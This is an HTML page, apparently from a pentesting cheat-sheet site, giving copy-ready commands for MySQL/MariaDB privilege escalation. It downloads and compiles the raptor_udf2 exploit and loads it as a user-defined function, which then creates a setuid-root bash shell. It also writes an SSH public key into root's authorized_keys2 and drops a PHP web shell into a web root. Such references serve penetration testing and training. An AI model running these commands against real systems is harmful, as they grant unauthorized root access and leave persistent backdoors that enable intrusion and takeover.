@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<title>Mysql Privilege Escalation | TLDRBins</title>
+<meta name="robots" content='noindex, nofollow'>
+<meta name="description" content="">
+<meta name="generator" content="hugo-index">
+<link crossorigin="anonymous" href="https://tldrbins.github.io/assets/stylesheet.css" rel="preload stylesheet" as="style">
+<script crossorigin="anonymous" src="https://tldrbins.github.io/assets/quicklink.js" rel="preload" as="script"></script>
+<script>
+    window.addEventListener('load', () => {
+        quicklink.listen();
+    });
+</script>
+
+  </head>
+  <body><header>
+  <h1>
+    <a href="https://tldrbins.github.io/">
+      <img src="https://tldrbins.github.io/index.png" alt="TLDRBins">
+      <span>TLDRBins</span>
+    </a>
+    <span class="hl">/</span>
+    <a href="https://tldrbins.github.io/mysql_privilege_escalation/">
+      <span>Mysql Privilege Escalation</span>
+    </a>
+  </h1>
+  <p class="desc"></p>
+</header>
+<div class="main">
+
+<ul class="tagsList single">
+  
+  <li><a href="https://tldrbins.github.io/@mysql/">Mysql</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@database/">Database</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@rce/">RCE</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@php/">Php</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@udf/">UDF</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@exploit/">Exploit</a></li>
+  
+</ul>
+
+<div class="content"><hr>
+<h3 id="privilege-escalation">Privilege Escalation</h3>
+<h4 id="user-defined-function-udf">User Defined Function (UDF)</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Get the raptor_udf2.c</span>
+</span></span><span class="line"><span class="cl">wget https://www.exploit-db.com/raw/1518 -O raptor_udf2.c
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Compile the source script</span>
+</span></span><span class="line"><span class="cl">gcc -g -c raptor_udf2.c
+</span></span><span class="line"><span class="cl">gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Copy to target folder</span>
+</span></span><span class="line"><span class="cl">cp raptor_udf2.so /dev/shm/raptor_udf2.so
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Connect to database as root</span>
+</span></span><span class="line"><span class="cl">mysql -u root -pPassword mysql
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># UDF</span>
+</span></span><span class="line"><span class="cl">create table foo<span class="o">(</span>line blob<span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">insert into foo values<span class="o">(</span>load_file<span class="o">(</span><span class="s1">&#39;/dev/shm/raptor_udf2.so&#39;</span><span class="o">))</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Get plug-in directory</span>
+</span></span><span class="line"><span class="cl">show variables like <span class="s1">&#39;%plugin%&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">+-----------------+---------------------------------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Variable_name   <span class="p">|</span> Value                                       <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+-----------------+---------------------------------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> plugin_dir      <span class="p">|</span> /usr/lib/x86_64-linux-gnu/mariadb19/plugin/ <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> plugin_maturity <span class="p">|</span> gamma                                       <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+-----------------+---------------------------------------------+
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Copy the plugin_dir value</span>
+</span></span><span class="line"><span class="cl"><span class="k">select</span> * from foo into dumpfile <span class="s1">&#39;/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so&#39;</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">create <span class="k">function</span> do_system returns integer soname <span class="s1">&#39;raptor_udf2.so&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># RCE</span>
+</span></span><span class="line"><span class="cl"><span class="k">select</span> do_system<span class="o">(</span><span class="s1">&#39;cp /bin/bash /tmp/shell; chmod 4777 /tmp/shell&#39;</span><span class="o">)</span><span class="p">;</span>
+</span></span></code></pre></div><h4 id="add-ssh-public-key-to-root">Add ssh public key to root</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Connect to database as root</span>
+</span></span><span class="line"><span class="cl">mysql -u root -pPassword mysql
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Check privilege</span>
+</span></span><span class="line"><span class="cl"><span class="k">select</span> current_user<span class="o">()</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">show grants <span class="k">for</span> root@localhost<span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># If mysql file write is not able to append or overwrite authorized_keys</span>
+</span></span><span class="line"><span class="cl"><span class="k">select</span> <span class="s2">&#34;ssh-ed25519 AAAAC4NzaC1lZDI1NTE8AAAAINAhYR5O6zwRnV147lX8FuuMLs7o+K5/WfaoYVa8SmbR user@computer&#34;</span> into outfile <span class="s2">&#34;/root/.ssh/authorized_keys2&#34;</span><span class="p">;</span>
+</span></span></code></pre></div><h4 id="create-php-file-from-database-to-rce">Create php File from Database to RCE</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="k">create</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="nf">test</span><span class="p">(</span><span class="n">stuff</span><span class="w"> </span><span class="kt">text</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">insert</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">test</span><span class="w"> </span><span class="k">values</span><span class="p">(</span><span class="s1">&#39;&lt;?php system($_REQUEST[&#34;cmd&#34;]); ?&gt;&#39;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">test</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">dumpfile</span><span class="w"> </span><span class="s1">&#39;C:\\xampp\\htdocs\\cmd.php&#39;</span><span class="p">;</span><span class="w">
+</span></span></span></code></pre></div><br></div></div>
+    
+    <script src="/copy-code-button.js"></script>
+    <footer>
+    <hr>
+    <div class="footer-text">
+        <div>© 2024 TLDRBins</div>
+        <div>Powered by <a href="https://gohugo.io/">Hugo</a> & <a
+                href="https://github.com/adityatelange/hugo-index/">Index</a></div>
+    </div>
+</footer>
+</body>
+</html>
